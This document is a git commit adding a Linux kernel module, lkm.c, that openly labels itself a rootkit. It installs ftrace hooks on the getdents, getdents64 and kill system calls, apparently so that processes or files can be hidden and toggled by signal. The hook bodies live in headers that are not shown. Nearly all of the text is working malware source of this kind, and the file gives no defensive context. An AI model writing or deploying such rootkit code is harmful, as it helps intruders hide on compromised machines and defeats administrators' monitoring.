165dea47fd3ea711471917da26603df8c81cf165
fs3cs0ciety <fs3cs0ciety@gmail.com>
2024-11-07 16:43:12 -0500

    Create lkm.c

---
+++ src/1.4_PID_toggle_inv/lkm.c
@@ -0,0 +1,35 @@
+#include "headers.h"
+#include "ftrace.h"
+#include "hooks/getdents64.h"
+#include "hooks/getdents.h"
+#include "hooks/kill.h"
+
+static struct ftrace_hook hooks[] = {
+    HOOK("__x64_sys_getdents64", hook_getdents64, &orig_getdents64),
+    HOOK("__x64_sys_getdents", hook_getdents, &orig_getdents),
+    HOOK("__x64_sys_kill", hook_kill, &orig_kill),
+};
+
+static int __init rootkit_init(void)
+{
+    int err;
+    err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
+    if(err)
+        return err;
+
+    printk(KERN_INFO "rootkit: Loaded >:-)\n");
+
+    return 0;
+}
+
+static void __exit rootkit_exit(void)
+{
+    fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
+    printk(KERN_INFO "rootkit: Unloaded :-(\n");
+}
+
+module_init(rootkit_init);
+module_exit(rootkit_exit);
+
+MODULE_LICENSE("GPL");
+MODULE_AUTHOR("d3dsec");
